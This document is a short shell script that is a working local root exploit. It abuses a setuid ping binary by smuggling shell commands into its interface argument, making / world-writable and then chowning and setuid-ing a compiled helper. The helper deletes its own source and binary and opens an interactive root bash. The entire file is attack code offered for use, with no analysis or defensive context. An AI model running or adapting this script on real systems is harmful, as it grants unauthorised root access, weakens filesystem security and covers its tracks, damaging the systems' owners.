#!/bin/sh
PING=/bin/ping6
test -u $PING || PING=/bin/ping

if [ ! -u $PING ]; then
  echo "Sorry, no setuid ping."
  exit 0
fi

echo "Phase 1: making / world-writable..."

$PING -I ';chmod o+w .' 195.117.3.59 &>/dev/null

sleep 1

echo "Phase 2: compiling helper application in /..."

cat >/x.c <<_eof_
main() {
  setuid(0); seteuid(0);
  system("chmod 755 /;rm -f /x; rm -f /x.c");
  execl("/bin/bash","bash","-i",0);
}
_eof_

gcc /x.c -o /x
chmod 755 /x

echo "Phase 3: chown+chmod on our helper application..."

$PING -I ';chown 0 x' 195.117.3.59 &>/dev/null
sleep 1
$PING -I ';chmod +s x' 195.117.3.59 &>/dev/null
sleep 1

if [ ! -u /x ]; then
  echo "Apparently, this is not exploitable on this system :("
  exit 1
fi

echo "Voila! Entering rootshell..."

/x

echo "Thank you."
echo "HUHA"
